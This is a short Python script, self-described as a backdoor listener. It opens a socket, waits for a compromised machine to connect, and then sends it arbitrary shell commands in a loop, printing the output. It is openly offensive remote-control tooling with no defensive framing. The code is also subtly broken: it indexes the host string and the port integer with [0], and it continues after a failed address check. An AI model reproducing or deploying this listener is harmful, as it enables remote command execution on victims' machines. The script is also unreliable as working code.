import ipaddress
import socket as sc
import argparse

p = argparse.ArgumentParser(description="Python backdoor listener !")
p.add_argument("--host", help="Host's IP Address to listen with", required=True, type=str)
p.add_argument("--port", help="Port to listen on", required=True, type=int)
args = p.parse_args()
try:
    host = args.host[0]
    port = args.port[0]
    if ipaddress.IPv4Address(host):
        pass
except ipaddress.AddressValueError:
    print("Wrong ip address was given, please try again.")

# Creating a Listener
server = sc.socket()
server.bind((host,port))
server.listen(1)
print(f"[+] Now listening on {host}:{port}")

# Accepting connection
target, rhost = server.accept()
print(f"[+] Connection was made by {rhost}")

# Running commands rapidly
while True:
    command = input("Enter a command : ").encode()
    target.send(command)
    print(f"The command '{command.decode()}' was sent !")
    output = target.recv(1024).decode()
    print(f"The output is : {output}")

